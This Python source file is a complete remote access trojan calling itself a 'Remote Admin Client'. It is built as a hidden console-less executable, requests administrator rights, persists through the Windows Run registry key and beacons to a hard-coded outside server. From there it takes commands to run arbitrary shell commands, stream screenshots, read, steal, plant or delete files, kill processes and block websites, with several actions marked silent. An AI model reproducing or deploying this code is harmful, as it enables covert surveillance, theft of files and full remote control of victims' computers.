"""
Remote Admin Client
Build:
    pip install pyinstaller pillow requests psutil pyqt5
    pyinstaller --onefile --noconsole --uac-admin main.py
"""
from __future__ import annotations

import base64
import json
import os
import platform
import queue
import socket
import subprocess
import sys
import threading
import time
import traceback
import uuid
from datetime import datetime
from io import BytesIO
from pathlib import Path
from typing import Dict, List, Optional, Tuple

import requests

try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None

try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

if sys.platform == "win32":
    import winreg

# ═══════════════════════════════════════════════════════════
#  CONFIG — edit before building
# ═══════════════════════════════════════════════════════════
SERVER_URL     = "https://getpassion.xyz"
HEARTBEAT_SECS = 3
STREAM_SECS    = 0.25
JPEG_QUALITY   = 55
STARTUP_NAME   = "RemoteAdminClient"
RAT_SECRET     = "your_rat_secret_here"
# ═══════════════════════════════════════════════════════════

HEARTBEAT_URL = f"{SERVER_URL}/api/rat/heartbeat"
ACK_URL       = f"{SERVER_URL}/api/rat/commands/{{cmd_id}}/ack"

# ── HWID ──────────────────────────────────────────────────
def get_hwid() -> str:
    if sys.platform == "win32":
        base = Path(os.environ.get("APPDATA", str(Path.home())))
    else:
        base = Path.home() / ".config"
    base.mkdir(parents=True, exist_ok=True)
    p = base / ".ra_hwid"
    if p.exists():
        return p.read_text().strip()
    hwid = str(uuid.uuid4())
    p.write_text(hwid)
    return hwid

HOSTNAME = socket.gethostname()
USERNAME = os.environ.get("USERNAME") or os.environ.get("USER") or "unknown"
PLATFORM = platform.system()
HWID     = get_hwid()

# ── Screenshot ─────────────────────────────────────────────
def capture_screenshot() -> Optional[str]:
    """Returns raw base64 JPEG string, or None on failure."""
    try:
        if ImageGrab:
            img = ImageGrab.grab()
        else:
            import shutil, tempfile
            if not shutil.which("scrot"):
                return None
            tmp = tempfile.NamedTemporaryFile(suffix=".png", delete=False)
            tmp.close()
            subprocess.run(["scrot", tmp.name], check=True, timeout=5)
            from PIL import Image
            img = Image.open(tmp.name)
            os.unlink(tmp.name)
        buf = BytesIO()
        img.convert("RGB").save(buf, format="JPEG", quality=JPEG_QUALITY)
        return base64.b64encode(buf.getvalue()).decode()
    except Exception:
        return None

# ── Stream ─────────────────────────────────────────────────
_streaming      = False
_stream_thread: Optional[threading.Thread] = None
_http_session:  Optional[requests.Session] = None

def _stream_loop() -> None:
    global _streaming
    while _streaming:
        b64 = capture_screenshot()
        if b64 and _http_session:
            try:
                _http_session.post(
                    HEARTBEAT_URL,
                    json={"hostname": HOSTNAME, "username": USERNAME,
                          "platform": PLATFORM, "hwid": HWID,
                          "stream_frame_b64": b64},
                    timeout=10,
                )
            except Exception:
                pass
        time.sleep(STREAM_SECS)

def start_stream() -> None:
    global _streaming, _stream_thread
    if _streaming:
        return
    _streaming = True
    _stream_thread = threading.Thread(target=_stream_loop, daemon=True)
    _stream_thread.start()

def stop_stream() -> None:
    global _streaming
    _streaming = False

# ── ACK ────────────────────────────────────────────────────
def ack_command(session: requests.Session, cmd_id: str) -> None:
    try:
        session.post(
            ACK_URL.format(cmd_id=cmd_id),
            headers={"x-rat-secret": RAT_SECRET},
            timeout=8,
        )
    except Exception:
        pass

# ── Startup ────────────────────────────────────────────────
def startup_enable() -> None:
    if sys.platform != "win32":
        return
    exe = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                           r"Software\Microsoft\Windows\CurrentVersion\Run",
                           0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, STARTUP_NAME, 0, winreg.REG_SZ, f'"{exe}"')
        winreg.CloseKey(k)
    except Exception:
        pass

def startup_disable() -> None:
    if sys.platform != "win32":
        return
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                           r"Software\Microsoft\Windows\CurrentVersion\Run",
                           0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(k, STARTUP_NAME)
        winreg.CloseKey(k)
    except Exception:
        pass

# ── Blocked sites ──────────────────────────────────────────
_current_blocked: List[str] = []

def _ps(cmd: str) -> bool:
    """Run a PowerShell command. Returns True on success."""
    try:
        r = subprocess.run(
            ["powershell", "-NonInteractive", "-Command", cmd],
            capture_output=True, timeout=15
        )
        return r.returncode == 0
    except Exception:
        return False

def _block_domain(domain: str) -> None:
    """Block a domain using Windows DNS client override (no hosts file needed)."""
    domain = domain.strip().lower()
    if not domain:
        return
    # Add-DnsClientNrptRule redirects DNS lookups for the domain to 0.0.0.0
    _ps(f'Add-DnsClientNrptRule -Namespace ".{domain}" -NameServers "0.0.0.0"')
    _ps(f'Add-DnsClientNrptRule -Namespace "{domain}" -NameServers "0.0.0.0"')

def _unblock_domain(domain: str) -> None:
    domain = domain.strip().lower()
    if not domain:
        return
    _ps(f'Get-DnsClientNrptRule | Where-Object {{$_.Namespace -eq ".{domain}" -or $_.Namespace -eq "{domain}"}} | Remove-DnsClientNrptRule -Force')

def sync_blocked(domains: List[str]) -> None:
    global _current_blocked
    if sorted(domains) == sorted(_current_blocked):
        return
    to_add    = [d for d in domains       if d not in _current_blocked]
    to_remove = [d for d in _current_blocked if d not in domains]
    for d in to_remove:
        _unblock_domain(d)
    for d in to_add:
        _block_domain(d)
    _current_blocked = list(domains)

# ── Processes ──────────────────────────────────────────────
def get_processes() -> List[Dict]:
    procs = []
    if HAS_PSUTIL:
        for p in psutil.process_iter(["pid", "name", "cpu_percent", "memory_info", "status"]):
            try:
                i = p.info
                procs.append({
                    "pid":    i["pid"] or 0,
                    "name":   i["name"] or "",
                    "cpu":    round(float(i.get("cpu_percent") or 0), 1),
                    "mem":    i["memory_info"].rss if i.get("memory_info") else 0,
                    "status": i.get("status") or "unknown",
                })
            except Exception:
                pass
    elif sys.platform == "win32":
        try:
            raw = subprocess.check_output(["tasklist", "/FO", "CSV", "/NH"],
                                          timeout=10, text=True)
            for line in raw.strip().splitlines():
                parts = [x.strip('"') for x in line.split('","')]
                if len(parts) >= 5:
                    try:
                        mem = int(parts[4].replace(",","").replace("\xa0K","")
                                          .replace(" K","").strip()) * 1024
                    except Exception:
                        mem = 0
                    procs.append({"pid": int(parts[1]) if parts[1].isdigit() else 0,
                                  "name": parts[0], "cpu": 0.0,
                                  "mem": mem, "status": "running"})
        except Exception:
            pass
    return procs[:500]

# ── File listing ───────────────────────────────────────────
def list_files(path: str) -> Tuple[List[Dict], str]:
    try:
        p = Path(path)
        if not p.exists():
            return [], str(p)
        entries = []
        try:
            items = list(p.iterdir())
        except PermissionError:
            return [], str(p)
        for item in sorted(items, key=lambda x: (not x.is_dir(), x.name.lower())):
            try:
                st = item.stat()
                entries.append({
                    "name":     item.name,
                    "path":     str(item),
                    "is_dir":   item.is_dir(),
                    "size":     st.st_size if item.is_file() else 0,
                    "modified": datetime.fromtimestamp(st.st_mtime).strftime("%Y-%m-%d %H:%M"),
                })
            except (PermissionError, OSError):
                pass  # skip junctions, protected files, etc.
        return entries, str(p)
    except Exception as e:
        return [], str(e)

def read_text_file(path: str) -> str:
    MAX = 102400
    try:
        data = Path(path).read_bytes()
        truncated = len(data) > MAX
        data = data[:MAX]
        for enc in ("utf-8", "utf-16", "latin-1", "cp1252"):
            try:
                text = data.decode(enc)
                return text + ("\n\n[... truncated at 100 KB ...]" if truncated else "")
            except Exception:
                pass
        return "[binary file — cannot display]"
    except Exception as e:
        return f"[read error] {e}"

# ── Message popup ──────────────────────────────────────────
_popup_queue: queue.Queue = queue.Queue()
_reply_queue: queue.Queue = queue.Queue()

def _popup_worker() -> None:
    """Background thread: show one popup at a time using native Windows dialog."""
    while True:
        body = _popup_queue.get()
        try:
            if sys.platform == "win32":
                import ctypes
                # MB_OKCANCEL=1, MB_ICONINFORMATION=0x40, MB_TOPMOST=0x40000
                ctypes.windll.user32.MessageBoxW(0, body, "Message", 0x40 | 0x40000)
            else:
                # Linux/Mac fallback
                subprocess.run(["notify-send", "Message", body], capture_output=True, timeout=5)
        except Exception:
            pass

# ── Command handler ────────────────────────────────────────
def handle_command(cmd: Dict) -> Dict:
    ctype   = cmd.get("type", "")
    payload = cmd.get("payload") or {}
    result: Dict = {}

    if ctype == "screenshot":
        b64 = capture_screenshot()
        if b64:
            result["screenshot_b64"] = b64

    elif ctype == "stream_start":
        start_stream()

    elif ctype == "stream_stop":
        stop_stream()

    elif ctype == "shell":
        command = payload.get("command", "")
        try:
            out = subprocess.check_output(
                command, shell=True, stderr=subprocess.STDOUT,
                timeout=30, text=True,
            )
        except subprocess.CalledProcessError as e:
            out = e.output or ""
        except Exception as e:
            out = str(e)
        result["message_reply"] = out[:8000] if out else "(no output)"

    elif ctype == "message":
        body = payload.get("body") or payload.get("text", "")
        if body:
            _popup_queue.put(body)
        # Do NOT echo body back as message_reply — server already saved admin message

    elif ctype == "file_list":
        path = payload.get("path") or str(Path.home())
        entries, cwd = list_files(path)
        result["files_json"] = json.dumps(entries)
        result["file_cwd"]   = cwd

    elif ctype == "file_read":
        path = payload.get("path", "")
        result["message_reply"] = f"[file_read: {path}]\n\n{read_text_file(path)}"

    elif ctype == "file_download":
        fp = payload.get("path", "")
        try:
            data = Path(fp).read_bytes()
            result["file_upload_b64"]  = base64.b64encode(data).decode()
            result["file_upload_path"] = fp
        except Exception as e:
            result["message_reply"] = f"[file_download error] {e}"

    elif ctype == "file_upload":
        b64      = payload.get("data_b64", "")
        dest_dir = payload.get("path") or str(Path.home())
        name     = payload.get("name", "upload")
        dest     = str(Path(dest_dir) / name)
        try:
            Path(dest).write_bytes(base64.b64decode(b64))
            # silent — no message_reply
        except Exception as e:
            result["message_reply"] = f"[file_upload error] {e}"

    elif ctype == "file_delete":
        fp = payload.get("path", "")
        try:
            p = Path(fp)
            if p.is_dir():
                import shutil; shutil.rmtree(p)
            else:
                p.unlink()
            # silent — no message_reply
        except Exception as e:
            result["message_reply"] = f"[file_delete error] {e}"

    elif ctype == "process_list":
        result["processes_json"] = json.dumps(get_processes())

    elif ctype == "process_kill":
        pid = payload.get("pid")
        try:
            if HAS_PSUTIL:
                psutil.Process(int(pid)).kill()
            elif sys.platform == "win32":
                subprocess.run(["taskkill", "/PID", str(pid), "/F"], timeout=5)
            else:
                os.kill(int(pid), 9)
            # silent — no message_reply
        except Exception as e:
            result["message_reply"] = f"[process_kill error] {e}"

    elif ctype == "block_sites":
        domains = payload.get("domains", [])
        merged = list(set(_current_blocked + domains))
        sync_blocked(merged)
        # silent — no message_reply

    elif ctype == "unblock_sites":
        domains = payload.get("domains", [])
        remaining = [d for d in _current_blocked if d not in domains]
        sync_blocked(remaining)
        # silent — no message_reply

    elif ctype == "startup_enable":
        startup_enable()
        # silent — no message_reply

    elif ctype == "startup_disable":
        startup_disable()
        # silent — no message_reply

    return result

# ── Heartbeat loop ─────────────────────────────────────────
def _heartbeat_loop() -> None:
    global _http_session
    session = requests.Session()
    session.headers.update({"Content-Type": "application/json"})
    _http_session = session

    while True:
        try:
            # Flush any popup replies the user typed
            replies: List[str] = []
            while not _reply_queue.empty():
                try:
                    replies.append(_reply_queue.get_nowait())
                except queue.Empty:
                    break

            hb: Dict = {"hostname": HOSTNAME, "username": USERNAME,
                        "platform": PLATFORM, "hwid": HWID}
            if replies:
                hb["message_reply"] = "\n---\n".join(replies)

            resp = session.post(HEARTBEAT_URL, json=hb, timeout=15)

            if resp.ok:
                data = resp.json()
                sync_blocked(data.get("blocked_sites", []))

                commands = data.get("commands", [])
                for cmd in commands:
                    cmd_id = cmd.get("id")

                    try:
                        result = handle_command(cmd)
                    except Exception:
                        result = {"message_reply": traceback.format_exc()[:2000]}

                    # ACK immediately
                    if cmd_id and str(cmd_id) != "screenshot_ondemand":
                        ack_command(session, str(cmd_id))

                    # Send result back
                    if result:
                        try:
                            session.post(
                                HEARTBEAT_URL,
                                json={"hostname": HOSTNAME, "username": USERNAME,
                                      "platform": PLATFORM, "hwid": HWID,
                                      **result},
                                timeout=15,
                            )
                        except Exception:
                            pass

                # If we got commands, immediately loop to pick up the next one
                # without waiting HEARTBEAT_SECS
                if commands:
                    continue

        except requests.exceptions.ConnectionError:
            pass
        except Exception:
            pass

        time.sleep(HEARTBEAT_SECS)


def run() -> None:
    # Start popup worker thread (shows native Windows dialogs)
    threading.Thread(target=_popup_worker, daemon=True).start()
    # Start heartbeat on background thread
    threading.Thread(target=_heartbeat_loop, daemon=True).start()
    # Keep main thread alive
    while True:
        time.sleep(60)

# ── Elevation ──────────────────────────────────────────────
def ensure_admin() -> None:
    if sys.platform != "win32":
        return
    import ctypes
    try:
        is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        is_admin = False
    if not is_admin:
        exe    = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
        params = " ".join(f'"{a}"' for a in sys.argv[1:])
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", exe, params or None, None, 0)
        except Exception:
            pass
        sys.exit(0)

# ── Entry point ────────────────────────────────────────────
if __name__ == "__main__":
    ensure_admin()
    run()